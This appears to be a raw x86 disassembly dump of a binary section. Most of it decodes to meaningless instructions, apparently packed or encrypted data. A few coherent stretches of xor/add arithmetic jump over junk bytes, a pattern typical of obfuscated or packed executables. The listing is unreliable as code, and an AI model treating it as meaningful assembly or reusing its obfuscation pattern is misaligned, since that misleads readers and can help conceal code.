  4084d4:	sbb    al,0xc8
  4084d6:	cmp    ecx,eax
  4084d8:	jo     0x408551
  4084da:	in     eax,0x5
  4084dc:	scas   eax,DWORD PTR es:[edi]
  4084dd:	and    al,0x7c
  4084df:	cmp    DWORD PTR [edx+0x4],ebx
  4084e2:	out    dx,eax
  4084e3:	aaa    
  4084e4:	nop
  4084e5:	sar    BYTE PTR [ebp+0x33694c48],1
  4084eb:	sub    DWORD PTR [esi],eax
  4084ed:	jmp    0x4084cc
  4084ef:	inc    ebx
  4084f0:	or     DWORD PTR [ebx+0x45915e86],0xffffffe2
  4084f7:	scas   al,BYTE PTR es:[edi]
  4084f8:	adc    al,0x9d
  4084fa:	jl     0x408542
  4084fc:	mov    ch,0x31
  4084fe:	inc    esi
  4084ff:	pop    ebp
  408500:	fiadd  DWORD PTR [edx+edx*8-0x38]
  408504:	adc    eax,0x97ee2d1e
  408509:	or     cl,BYTE PTR [edi+0x8]
  40850c:	dec    edi
  40850d:	inc    ecx
  40850e:	call   0xce042e21
  408513:	lods   eax,DWORD PTR ds:[esi]
  408514:	je     0x40857f
  408516:	(bad)  
  408517:	cmp    DWORD PTR [edx+0xd],esi
  40851a:	sub    al,0x91
  40851c:	inc    edx
  40851d:	mov    eax,0x4b67c29d
  408522:	xchg   esp,eax
  408523:	cs (bad) 
  408525:	xor    eax,0x73d51e6c
  40852a:	and    ah,0x8a
  40852d:	loope  0x4084c4
  40852f:	pop    ds
  408530:	and    DWORD PTR [ecx-0x7f],0x36cea04d
  408537:	xchg   DWORD PTR [edi],ecx
  408539:	mov    WORD PTR ds:0x263a2f6c,ss
  40853f:	adc    al,0xef
  408541:	xchg   edx,eax
  408542:	bound  ecx,QWORD PTR ds:0x61210c8
  408548:	and    BYTE PTR [ebp+0x4ab62b0c],0x87
  40854f:	add    DWORD PTR [eax+0x65b6aded],esp
  408555:	xor    eax,DWORD PTR [ebx+0x60699f42]
  40855b:	jae    0x4085c2
  40855d:	ficomp WORD PTR [eax]
  40855f:	clc    
  408560:	ins    DWORD PTR es:[edi],dx
  408561:	dec    ebp
  408562:	push   0x32
  408564:	test   eax,0xb3faa734
  408569:	xchg   ebp,eax
  40856a:	add    BYTE PTR ds:0x4901bcea,dl
  408570:	xor    eax,0x44aaa04f
  408575:	mov    DWORD PTR [ecx-0x72],edx
  408578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408579:	add    DWORD PTR [edx],0xffffffd2
  40857c:	(bad)
  40857f:	mov    ds:0x17699bd5,al
  408584:	cmp    ah,BYTE PTR [eax-0x1d]
  408587:	or     al,0x89
  408589:	cmp    edi,DWORD PTR [eax+0x33bbb8a6]
  40858f:	mov    edx,0x41004a36
  408594:	xor    ebp,DWORD PTR [ecx+ebp*2+0x49]
  408598:	iret   
  408599:	jbe    0x4085d9
  40859b:	lock adc eax,0x4f5434d9
  4085a1:	jge    0x4085b5
  4085a3:	pop    esi
  4085a4:	loopne 0x408596
  4085a6:	xchg   DWORD PTR [eax],edx
  4085a8:	data16 arpl WORD PTR fs:[ebp+0x6dbbaa95],si
  4085b0:	xchg   edx,eax
  4085b1:	mov    ds:0x246604fe,al
  4085b6:	xor    ah,BYTE PTR [ebx]
  4085b8:	adc    DWORD PTR [eax+0x2a],ebx
  4085bb:	fwait
  4085bc:	out    dx,eax
  4085bd:	jmp    0x378427d9
  4085c2:	push   0xc8352e8
  4085c7:	xchg   ebx,eax
  4085c8:	cmp    edx,ebx
  4085ca:	(bad)  
  4085cb:	repz mov eax,0x12e85453
  4085d1:	dec    edi
  4085d2:	inc    edx
  4085d3:	mov    edi,0x9ff9189
  4085d8:	in     al,0xbd
  4085da:	pop    ecx
  4085db:	out    dx,al
  4085dc:	test   edi,edx
  4085de:	jp     0x4085e2
  4085e0:	adc    DWORD PTR [esi],ecx
  4085e2:	dec    eax
  4085e3:	std    
  4085e4:	fstp   QWORD PTR ss:[ebp*1-0x1a3c1f26]
  4085ec:	inc    ebx
  4085ed:	jp     0x4085aa
  4085ef:	mov    esp,0x1640dae6
  4085f4:	or     DWORD PTR ds:0xbf7d22e,ebp
  4085fa:	cmp    al,0x85
  4085fc:	scas   eax,DWORD PTR es:[edi]
  4085fd:	lods   eax,DWORD PTR ds:[esi]
  4085fe:	jge    0x40862e
  408600:	push   edi
  408601:	ins    DWORD PTR es:[edi],dx
  408602:	jo     0x4085d4
  408604:	test   esi,0xd670fe6e
  40860a:	jmp    0x40862a
  40860c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40860d:	scas   al,BYTE PTR es:[edi]
  40860e:	xchg   DWORD PTR [eax+0x3b],ebp
  408611:	scas   al,BYTE PTR es:[edi]
  408612:	sub    al,0x95
  408614:	(bad)
  408619:	ret    0x3b66
  40861c:	adc    al,cl
  40861e:	std    
  40861f:	clts   
  408621:	js     0x408650
  408623:	cmp    al,0xab
  408625:	sub    bl,BYTE PTR [ecx]
  408627:	and    DWORD PTR [eax+0x16d95091],ebx
  40862d:	and    bl,bl
  40862f:	cmp    ah,BYTE PTR [edi+0x32361f19]
  408635:	sub    ch,BYTE PTR [ecx-0x14]
  408638:	test   BYTE PTR [ebx],ah
  40863a:	lods   al,BYTE PTR ds:[esi]
  40863b:	jae    0x408681
  40863d:	mov    dh,0x9b
  40863f:	test   al,0x7a
  408641:	dec    esp
  408642:	daa    
  408643:	inc    edx
  408644:	lea    esi,[ebx-0x46]
  408647:	or     DWORD PTR [edi],ecx
  408649:	or     al,0x59
  40864b:	ret    
  40864c:	pop    ds
  40864d:	adc    BYTE PTR [ebx-0x7f503e21],bl
  408653:	inc    esi
  408654:	inc    esp
  408655:	pop    esi
  408656:	fsub   DWORD PTR [edx+0x62]
  408659:	or     dh,BYTE PTR [ebx-0x22]
  40865c:	mov    BYTE PTR ds:0x9a2154a4,ah
  408662:	add    eax,0xb1c8b7f3
  408667:	sub    dh,BYTE PTR [eax-0x11]
  40866a:	pushf  
  40866b:	(bad)  
  40866c:	out    0x12,al
  40866e:	xchg   esp,eax
  40866f:	or     al,BYTE PTR [edi]
  408671:	push   ds
  408672:	shl    BYTE PTR [eax-0x5f],0x9d
  408676:	loopne 0x40867c
  408678:	mov    edx,0xa79c9258
  40867d:	push   es
  40867e:	shl    DWORD PTR [esi+ebx*8],1
  408681:	inc    eax
  408682:	and    eax,0x912f42f2
  408687:	sbb    esp,esi
  408689:	in     al,0xc2
  40868b:	jbe    0x4086b3
  40868d:	pop    ebp
  40868e:	jmp    0x408640
  408690:	mov    ah,0x7d
  408692:	or     al,BYTE PTR [ecx]
  408694:	in     eax,dx
  408695:	inc    esi
  408696:	push   esi
  408697:	arpl   WORD PTR fs:[ebx+edi*4],di
  40869b:	mov    eax,0x818e12fe
  4086a0:	adc    eax,0x4337e3
  4086a5:	jnp    0x4086de
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	cmp    BYTE PTR [ebx+0x0],al
  4086b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x228724a],ecx
  4086ca:	and    DWORD PTR [edx+0x247e7ed6],ecx
  4086d0:	jl     0x408750
  4086d2:	jle    0x4086d8
  4086d4:	in     al,dx
  4086d5:	outs   dx,DWORD PTR ds:[esi]
  4086d6:	inc    esp
  4086d7:	jb     0x40869b
  4086d9:	xchg   esp,eax
  4086da:	xchg   esp,eax
  4086db:	xor    DWORD PTR [ebx+0x3e],ebx
  4086de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086df:	std    
  4086e0:	or     eax,0xac3799ed
  4086e5:	cmp    DWORD PTR [edx+0x6],ebp
  4086e8:	xchg   esi,eax
  4086e9:	xchg   ebx,eax
  4086ea:	xor    DWORD PTR [esi+0x3d],esi
  4086ed:	call   0x1d299e3a
  4086f2:	and    BYTE PTR [esi-0x7f],dl
  4086f5:	jecxz  0x4086c1
  4086f7:	jnp    0x4086c7
  4086f9:	mov    cl,0xe4
  4086fb:	int    0xf8
  4086fd:	fadd   st,st(3)
  4086ff:	dec    eax
  408700:	sar    ebp,cl
  408702:	jmp    0x7d5e0ed8
  408707:	loop   0x408787
  408709:	sub    edx,eax
  40870b:	mov    esp,0x4be1fa39
  408710:	movq   QWORD PTR [edx],mm1
  408713:	hlt    
  408714:	sbb    esp,ebp
  408716:	popa   
  408717:	cli    
  408718:	pusha  
  408719:	aam    0xaf
  40871b:	fnstcw WORD PTR [ebx]
  40871d:	imul   edx,DWORD PTR ds:0xef0ff72f,0x28
  408724:	hlt    
  408725:	(bad)
  408728:	mov    esi,0xf85a268c
  40872d:	xchg   esp,eax
  40872e:	stos   DWORD PTR es:[edi],eax
  40872f:	enter  0x970f,0xe7
  408733:	jne    0x40871f
  408735:	and    bh,dl
  408737:	jge    0x4086e7
  408739:	and    cl,0xf6
  40873c:	xor    al,0xda
  40873e:	mov    bh,0x5f
  408740:	xchg   edx,eax
  408741:	jae    0x40874a
  408743:	jno    0x408786
  408745:	lock sbb DWORD PTR [ebx+0x54],edx
  408749:	mov    ebp,0x16c3ca16
  40874e:	les    edx,FWORD PTR [ebx+0x50]
  408751:	push   0xffffffb2
  408753:	sbb    DWORD PTR [esp+esi*1-0x48],0x5c
  408758:	data16 mov cl,0xcb
  40875b:	jg     0x4086fb
  40875d:	xor    ecx,DWORD PTR [ecx]
  40875f:	retf   0xb8d9
  408762:	cmp    BYTE PTR [ebx-0x7e46851c],0xa5
  408769:	jbe    0x408781
  40876b:	dec    edx
  40876c:	ins    DWORD PTR es:[edi],dx
  40876d:	stos   BYTE PTR es:[edi],al
  40876e:	xor    BYTE PTR [ebx-0x2b1e80a6],0xf3
  408775:	pop    eax
  408776:	and    eax,0x395e36ce
  40877b:	add    al,0x89
  40877d:	pop    ebx
  40877e:	cli    
  40877f:	mov    dl,0x77
  408781:	test   DWORD PTR [esi],ebx
  408783:	inc    edi
  408784:	iret   
  408785:	arpl   WORD PTR [esi-0x1c4bdbfe],dx
  40878b:	stc    
  40878c:	xor    edi,DWORD PTR [ecx]
  40878e:	ins    DWORD PTR es:[edi],dx
  40878f:	test   eax,0xe3c1b393
  408794:	mov    ecx,0x28a4e607
  408799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40879a:	push   esp
  40879b:	test   al,0xc9
  40879d:	stc    
  40879e:	dec    esp
  40879f:	sbb    esp,esi
  4087a1:	cmp    BYTE PTR [ebx+edx*2-0x184bb759],ch
  4087a8:	fadd   QWORD PTR [edi+ebp*8-0x298834f4]
  4087af:	(bad)  
  4087b0:	jno    0x4087a0
  4087b2:	loop   0x408757
  4087b4:	sbb    ecx,DWORD PTR [edi+0x6448b5db]
  4087ba:	test   al,0x3e
  4087bc:	jecxz  0x4087c4
  4087be:	inc    ebx
  4087bf:	dec    ebp
  4087c0:	outs   dx,BYTE PTR ds:[esi]
  4087c1:	cs ds punpcklbw mm3,mm3
  4087c6:	xchg   ebp,eax
  4087c7:	in     eax,dx
  4087c8:	xor    al,0x58
  4087ca:	sub    BYTE PTR [ebx+0x4a],0x96
  4087ce:	pop    es
  4087cf:	in     al,0x87
  4087d1:	iret   
  4087d2:	cmp    al,BYTE PTR [eax+edi*2+0x6e186d58]
  4087d9:	sbb    BYTE PTR [edi-0x5af9a3d0],ch
  4087df:	xchg   esi,eax
  4087e0:	fcomi  st,st(0)
  4087e2:	jg     0x408807
  4087e4:	mov    ds:0x2d80d0b,al
  4087e9:	cld    
  4087ea:	pusha  
  4087eb:	rcr    DWORD PTR [esi],0xd4
  4087ee:	xor    DWORD PTR [eax-0x78],0xd6ec2c58
  4087f5:	push   0xfb473380
  4087fa:	adc    ecx,DWORD PTR [esp+ebx*4]
  4087fd:	push   ebx
  4087fe:	in     al,0x66
  408800:	push   es
  408801:	nop
  408802:	ficomp DWORD PTR [eax-0xc]
  408805:	xchg   ecx,eax
  408806:	sti    
  408807:	or     ebx,DWORD PTR [eax]
  408809:	jmp    0xf0f4:0x398416c8
  408810:	xor    al,0xb2
  408812:	sub    bl,ah
  408814:	mov    ds:0x44a0350c,al
  408819:	xor    eax,0xf981cafd
  40881e:	and    al,0x63
  408820:	les    edx,FWORD PTR [eax-0x2a]
  408823:	sub    esi,DWORD PTR [edi-0x49]
  408826:	mov    al,ds:0xfb09bb1f
  40882b:	imul   esi,DWORD PTR [ecx+ecx*2-0x3],0x7ed20654
  408833:	add    eax,0x62091fe8
  408838:	(bad)  
  408839:	mov    DWORD PTR [esp+eiz*8+0xfe6e5fe],edx
  408840:	mov    edx,0x86e3129f
  408845:	shr    DWORD PTR [ebp-0x7c],cl
  408848:	fisttp QWORD PTR [edi+0x5c]
  40884b:	dec    esp
  40884c:	dec    ecx
  40884d:	jns    0x408822
  40884f:	bound  eax,QWORD PTR [ebx-0x15]
  408852:	(bad)  
  408854:	arpl   WORD PTR [edx+0x44a1d007],ax
  40885a:	jae    0x4087e2
  40885c:	stos   BYTE PTR es:[edi],al
  40885d:	mov    esi,0x4d9081fd
  408862:	lea    ebp,[ecx]
  408864:	add    eax,0xe08ddcb3
  408869:	mov    esp,0xa8e2be9
  40886e:	xor    edi,0x217378bc
  408874:	add    BYTE PTR [edi],al
  408876:	xchg   edi,eax
  408877:	adc    DWORD PTR [ebp-0xae82c1f],0x61
  40887e:	in     eax,0x12
  408880:	fcmovnb st,st(7)
  408882:	enter  0x6de3,0x5d
  408886:	xchg   BYTE PTR [eax+0x22],cl
  408889:	inc    ebp
  40888a:	cdq    
  40888b:	out    dx,al
  40888c:	call   0x12a43d90
  408891:	ins    BYTE PTR es:[edi],dx
  408892:	push   eax
  408893:	or     ch,al
  408895:	mov    ch,0xc
  408897:	inc    ebp
  408898:	xchg   esi,eax
  408899:	and    BYTE PTR [ecx-0x42],0x45
  40889d:	dec    esp
  40889e:	jbe    0x4088fb
  4088a0:	pop    eax
  4088a1:	or     ecx,0xfffffffd
  4088a4:	sbb    al,0xa9
  4088a6:	mul    BYTE PTR [eax-0x46c1bb64]
  4088ac:	ss sahf 
  4088ae:	jp     0x4088e6
  4088b0:	adc    BYTE PTR [esi+0x1cc55ff6],cl
  4088b6:	out    0xc3,al
  4088b8:	scas   al,BYTE PTR es:[edi]
  4088b9:	dec    edi
  4088ba:	outs   dx,DWORD PTR ds:[esi]
  4088bb:	retf   0xde43
  4088be:	imul   edx,DWORD PTR [edx+0x12],0xffffffc8
  4088c2:	cwde   
  4088c3:	stos   DWORD PTR es:[edi],eax
  4088c4:	adc    esp,esp
  4088c6:	jmp    0x40892f
  4088c8:	int3   
  4088c9:	loop   0x408929
  4088cb:	jns    0x4088d0
  4088cd:	ret    
  4088ce:	out    0x66,al
  4088d0:	fmulp  st(7),st
  4088d2:	retf   
  4088d3:	repnz (bad) 
  4088d5:	sub    eax,0xb57503bf
  4088da:	in     al,0xd4
  4088dc:	retf   0xcc7d
  4088df:	jp     0x408922
  4088e1:	loopne 0x4088f9
  4088e3:	hlt    
  4088e4:	sub    ebp,DWORD PTR cs:[edx-0x48]
  4088e8:	(bad)  
  4088e9:	daa    
  4088ea:	jne    0x408954
  4088ec:	xor    eax,0x38c3eea5
  4088f1:	imul   ebx,DWORD PTR [esi],0xffffffe1
  4088f4:	pop    ebx
  4088f5:	dec    ecx
  4088f6:	repnz or BYTE PTR [ebp+esi*4-0x7f],ah
  4088fb:	fld    TBYTE PTR [ebp-0x75]
  4088fe:	add    BYTE PTR [ecx+0x4337e335],al
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xb6a4b2c
  408968:	out    dx,eax
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	ins    DWORD PTR es:[edi],dx
  408972:	push   ebx
  408973:	cwde   
  408974:	test   eax,0xb9647e78
  408979:	outs   dx,DWORD PTR ds:[esi]
  40897a:	jae    0x4089a8
  40897c:	dec    ebx
  40897d:	pop    esp
  40897e:	jp     0x40892e
  408980:	out    dx,al
  408981:	and    ebp,DWORD PTR [esi-0x5190c9e2]
  408987:	call   ebp
  408989:	and    edx,DWORD PTR [edx]
  40898b:	nop
  40898c:	in     eax,0x59
  40898e:	mov    bh,0xb7
  408990:	or     BYTE PTR [edi],dl
  408992:	sbb    bh,BYTE PTR [ebx+0x77bbf054]
  408998:	aas    
  408999:	leave  
  40899a:	clc    
  40899b:	(bad)  
  40899c:	clc    
  40899d:	test   BYTE PTR [esi],0x30
  4089a0:	adc    DWORD PTR [eax-0x55fa7656],esp
  4089a6:	or     ch,BYTE PTR [ecx-0x52]
  4089a9:	jne    0x408962
  4089ab:	jo     0x4089ef
  4089ad:	hlt    
  4089ae:	(bad)  
  4089af:	mov    ds:0xe85d1523,eax
  4089b4:	call   0xd002e639
  4089b9:	lods   eax,DWORD PTR ds:[esi]
  4089ba:	pop    ebx
  4089bb:	jno    0x408941
  4089bd:	cwde   
  4089be:	xchg   BYTE PTR [ebp+ebx*1-0x4e],ch
  4089c2:	int    0xfa
  4089c4:	lea    esp,[edx+0xe]
  4089c7:	jne    0x408a2f
  4089c9:	dec    eax
  4089ca:	sub    bh,0x2e
  4089cd:	mov    ch,0x9d
  4089cf:	xor    ah,BYTE PTR [eax]
  4089d1:	or     eax,0x82ea3631
  4089d6:	push   0x8a56b205
  4089db:	enter  0xc25e,0x56
  4089df:	sti    
  4089e0:	inc    ecx
  4089e1:	mov    al,0x74
  4089e3:	mov    dl,0xbb
  4089e5:	inc    ebp
  4089e6:	loopne 0x4089c9
  4089e8:	xchg   BYTE PTR [edi-0x42fbe279],ch
  4089ee:	cli    
  4089ef:	jno    0x408a44
  4089f1:	imul   esp,DWORD PTR [ebx],0xffffffcd
  4089f4:	fmul   QWORD PTR [ebp+0xd84c923]
  4089fa:	lds    eax,FWORD PTR [edi-0x10]
  4089fd:	and    al,bl
  4089ff:	shl    BYTE PTR [esi-0x10],cl
  408a02:	push   cs
  408a03:	mov    BYTE PTR [ebp-0x51],0x41
  408a07:	lods   eax,DWORD PTR ds:[esi]
  408a08:	jg     0x408a07
  408a0a:	jge    0x4089cf
  408a0c:	ins    BYTE PTR es:[edi],dx
  408a0d:	jp     0x408a44
  408a0f:	xor    eax,0x1fd2f76d
  408a14:	xor    al,bh
  408a16:	stos   BYTE PTR es:[edi],al
  408a17:	fistp  DWORD PTR [edi-0x6a]
  408a1a:	add    bl,BYTE PTR ds:0xff523ba7
  408a20:	in     al,0xf0
  408a22:	aad    0xa4
  408a24:	push   0x29
  408a26:	inc    ebx
  408a27:	gs pop ds
  408a29:	jne    0x408a7f
  408a2b:	mov    edx,0x8136fcc3
  408a30:	jb     0x408a9a
  408a32:	and    eax,0xc31260a0
  408a37:	mov    edi,0x5bdf25ea
  408a3c:	dec    ebp
  408a3d:	ret    
  408a3e:	dec    ebx
  408a3f:	mov    ebp,0x5e7dbb66
  408a44:	sbb    edi,DWORD PTR [edi]
  408a46:	scas   al,BYTE PTR es:[edi]
  408a47:	test   BYTE PTR [edi-0x71],0x9a
  408a4b:	sub    BYTE PTR [esi-0x4ab44e1f],0xb6
  408a52:	cmp    bl,ch
  408a54:	loopne 0x408a9c
  408a56:	mov    esp,0x42e69b32
  408a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a5c:	xchg   edi,eax
  408a5d:	sub    DWORD PTR [esi+0x1a],0x62
  408a61:	shl    DWORD PTR [ebx+ebp*1],0xd0
  408a65:	jo     0x408ab0
  408a67:	sub    ebx,DWORD PTR [edx]
  408a69:	mov    DWORD PTR es:[eax],ecx
  408a6c:	fstp   DWORD PTR [ecx+0x6d]
  408a6f:	or     al,0x84
  408a71:	fwait
  408a72:	retf   0x2613
  408a75:	pop    ebx
  408a76:	jbe    0x408a3c
  408a78:	dec    ecx
  408a79:	imul   ecx,DWORD PTR ds:0x62c8ceb1,0x1e9ac873
  408a83:	mov    DWORD PTR [esi-0x42],0xa1a0c019
  408a8a:	inc    ebp
  408a8b:	fadd   DWORD PTR [edi+0x73c2758b]
  408a91:	sbb    eax,0xbb5ead7f
  408a96:	test   ebp,0x9cb47e63
  408a9c:	and    BYTE PTR [eax],cl
  408a9e:	stos   DWORD PTR es:[edi],eax
  408a9f:	cmp    BYTE PTR [eax+ebx*2-0x7a],cl
  408aa3:	mov    esp,0xa7c6839b
  408aa8:	std    
  408aa9:	xchg   ebx,eax
  408aaa:	ss ss mov esp,0x6e16c0de
  408ab1:	jno    0x408a8b
  408ab3:	xor    BYTE PTR [eax+0x3f],bl
  408ab6:	cli    
  408ab7:	push   ds
  408ab8:	add    eax,0xf873ce71
  408abd:	add    al,0xde
  408abf:	and    DWORD PTR [edx],edx
  408ac1:	imul   ebp,DWORD PTR [ecx+0x793a2a39],0xfffffff5
  408ac8:	cmc    
  408ac9:	inc    edi
  408aca:	outs   dx,BYTE PTR ds:[esi]
  408acb:	mov    ds:0xaf3c395e,eax
  408ad0:	xor    eax,0x8aa7320
  408ad5:	inc    ecx
  408ad6:	fiadd  DWORD PTR [eax+ebx*8+0x2]
  408ada:	les    esp,FWORD PTR ds:0x2afd
  408adf:	dec    edi
  408ae0:	mov    eax,0x49ad488c
  408ae5:	mov    al,0x48
  408ae7:	inc    edi
  408ae8:	sub    ah,BYTE PTR [edi-0x6d506b9e]
  408aee:	xchg   ecx,eax
  408aef:	dec    edx
  408af0:	dec    edi
  408af1:	sub    eax,0x5b25e3d1
  408af6:	xor    edx,DWORD PTR [esi-0x9883afc]
  408afc:	clc    
  408afd:	xor    eax,0x531e268d
  408b02:	add    bh,BYTE PTR [eax+edx*2+0x2c793a1e]
  408b09:	push   esp
  408b0a:	fadd   st(6),st
  408b0c:	cmp    DWORD PTR [ebp+0x202d6011],ebx
  408b12:	push   edx
  408b13:	cmc    
  408b14:	xchg   esi,eax
  408b15:	inc    esi
  408b16:	pop    ecx
  408b17:	cmp    ebp,eax
  408b19:	ret    0x6364
  408b1c:	inc    DWORD PTR [edi-0x2]
  408b1f:	and    BYTE PTR [esi],0x3c
  408b22:	mov    WORD PTR [eax],fs
  408b24:	fwait
  408b25:	xchg   BYTE PTR [edi+esi*4-0x10],bl
  408b29:	repz cwde 
  408b2b:	xchg   ebp,eax
  408b2c:	ror    DWORD PTR [ebp-0x555687a9],1
  408b32:	jp     0x408ad8
  408b34:	adc    DWORD PTR [ecx+0x4e1625f0],edx
  408b3a:	call   DWORD PTR [ebx-0x1]
  408b3d:	popa   
  408b3e:	loop   0x408ac0
  408b40:	pop    ds
  408b41:	pop    ebx
  408b42:	(bad)
  408b45:	or     ch,0x7a
  408b48:	jge    0x408ad2
  408b4a:	jno    0x408b0d
  408b4c:	fld    QWORD PTR [edi+edx*4-0xb]
  408b50:	ins    BYTE PTR es:[edi],dx
  408b51:	add    dl,BYTE PTR [eax-0x1]
  408b54:	sub    al,0xbb
  408b56:	(bad)  
  408b57:	out    dx,eax
  408b58:	xchg   DWORD PTR [ecx],edx
  408b5a:	mov    dl,0x93
  408b5c:	pop    edx
  408b5d:	cmp    bh,0x9e
  408b60:	adc    eax,0xb7d0aa85
  408b65:	push   eax
  408b66:	aas    
  408b67:	dec    DWORD PTR [eax+edi*2-0x7bd846ea]
  408b6e:	pop    ebp
  408b6f:	dec    esp
  408b70:	mov    al,0xa4
  408b72:	push   esp
  408b73:	stos   DWORD PTR es:[edi],eax
  408b74:	in     eax,0x79
  408b76:	add    edx,0xc2891e79
  408b7c:	inc    eax
  408b7d:	stc    
  408b7e:	mov    cl,0x41
  408b80:	test   al,0xa9
  408b82:	aad    0x7a
  408b84:	dec    ecx
  408b85:	mov    eax,ds:0x2aa0b975
  408b8a:	test   BYTE PTR [esi+0x15ab9ab9],cl
  408b90:	pop    esi
  408b91:	pusha  
  408b92:	call   0x12201b26
  408b97:	dec    ebp
  408b98:	mov    cl,0xa2
  408b9a:	cmp    DWORD PTR [edi],ecx
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	dec    edi
  408bf1:	push   ebp
  408bf2:	sub    ch,BYTE PTR [esi+eiz*2-0x2e]
  408bf6:	jle    0x408c76
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	rol    BYTE PTR [esi-0x66fbebba],1
  408c02:	ret    
  408c03:	out    dx,eax
  408c04:	(bad)  
  408c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c06:	aaa    
  408c07:	add    ah,BYTE PTR [edx]
  408c09:	or     al,0x16
  408c0b:	sub    esp,DWORD PTR [ebx]
  408c0d:	inc    edx
  408c0e:	js     0x408c0a
  408c10:	test   eax,0x592e850a
  408c15:	fstp   DWORD PTR [esi]
  408c17:	in     al,0x79
  408c19:	mov    ch,0xa
  408c1b:	dec    edx
  408c1c:	jbe    0x408c5b
  408c1e:	jno    0x408c1e
  408c20:	mov    ebp,0x5a50fa8e
  408c25:	adc    esp,edi
  408c27:	imul   edi,esi,0x4970a1d
  408c2d:	scas   eax,DWORD PTR es:[edi]
  408c2e:	jle    0x408ca2
  408c30:	out    dx,eax
  408c31:	nop
  408c32:	mov    bh,0x59
  408c34:	mov    al,0x71
  408c36:	out    dx,al
  408c37:	pop    ss
  408c38:	add    BYTE PTR [edx-0x23],ch
  408c3b:	icebp  
  408c3c:	add    eax,0xa1c52e9e
  408c41:	mul    BYTE PTR [eax-0x33]
  408c44:	cmp    eax,0x2d068e3c
  408c49:	mov    cl,0x96
  408c4b:	das    
  408c4c:	out    dx,eax
  408c4d:	mov    dh,0x78
  408c4f:	inc    edx
  408c50:	cli    
  408c51:	bnd ja 0x408c3e
  408c54:	xor    eax,0xf867544e
  408c59:	les    edi,FWORD PTR [edi]
  408c5b:	rcr    BYTE PTR [eax+0x51],1
  408c5e:	mov    eax,ds:0xd17931e9
  408c63:	jo     0x408c16
  408c65:	xchg   edx,eax
  408c66:	(bad)  
  408c68:	pop    ecx
  408c69:	pop    edi
  408c6a:	int3   
  408c6b:	in     eax,0x28
  408c6d:	jnp    0x408c28
  408c6f:	mov    al,0xfc
  408c71:	fdiv   QWORD PTR [ecx]
  408c73:	pop    ecx
  408c74:	lods   eax,DWORD PTR ds:[esi]
  408c75:	cs jmp 0x408caa
  408c78:	pop    esi
  408c79:	pusha  
  408c7a:	int    0xe0
  408c7c:	pop    esp
  408c7d:	jne    0x408cc4
  408c7f:	in     eax,dx
  408c80:	xabort 0x9f
  408c83:	xor    BYTE PTR [eax+0x71],al
  408c86:	(bad)  
  408c87:	in     al,0x28
  408c89:	mov    edi,0x91db814a
  408c8e:	sub    BYTE PTR [ecx+0x3c61365a],ah
  408c94:	xor    DWORD PTR [edx],esi
  408c96:	jmp    0x408c51
  408c98:	jle    0x408c8a
  408c9a:	dec    esp
  408c9b:	xor    bh,dl
  408c9d:	sub    al,0xf9
  408c9f:	cdq    
  408ca0:	adc    DWORD PTR [eax+0x6e],edi
  408ca3:	add    al,BYTE PTR [esi+0x2e]
  408ca6:	ret    0xa892
  408ca9:	xor    ebp,DWORD PTR [ecx+0x4a]
  408cac:	mov    dh,0x4c
